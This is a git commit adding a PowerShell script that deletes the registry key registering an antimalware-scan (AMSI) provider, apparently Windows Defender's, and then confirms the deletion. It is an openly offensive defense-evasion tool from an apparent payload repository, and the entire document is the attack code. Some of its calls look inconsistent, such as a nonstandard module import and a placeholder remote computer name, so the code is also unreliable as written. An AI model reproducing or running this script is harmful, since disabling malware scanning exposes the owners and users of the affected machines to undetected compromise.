0709e2d873feb1a568b253173bbd7a861f8fb349
payloads45 <111106697+payloads45@users.noreply.github.com>
2022-12-05 06:37:39 -0800

    Create remove-registry-amsi.ps1

---
+++ Registry Shenanigans/remove-registry-amsi.ps1
@@ -0,0 +1,34 @@
+
+
+
+# Import the registry module
+Import-Module -Name Registry
+
+# Load the registry hive
+$registryHive = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'ComputerName')
+
+# Open the registry key that you want to remove
+$registryKey = $registryHive.OpenSubKey('Software\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}', $true)
+
+# Check whether the registry key exists
+if ($registryKey -ne $null)
+{
+    # Delete the registry key and all its subkeys
+    Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+}
+
+# Enumerate the registry keys in the AMSI Providers registry key
+$registryKey = $registryHive.OpenSubKey('Software\Microsoft\AMSI\Providers')
+$registryKeys = $registryKey.GetSubKeyNames()
+
+# Check whether the registry key has been removed
+if (-not $registryKeys.Contains('{2781761E-28E0-4109-99FE-B9D127C57AFE}'))
+{
+    # Print a message indicating that the registry key has been removed
+    Write-Output "The registry key has been removed"
+}
+else
+{
+    # Print a message indicating that the registry key still exists
+    Write-Output "The registry key still exists"
+}
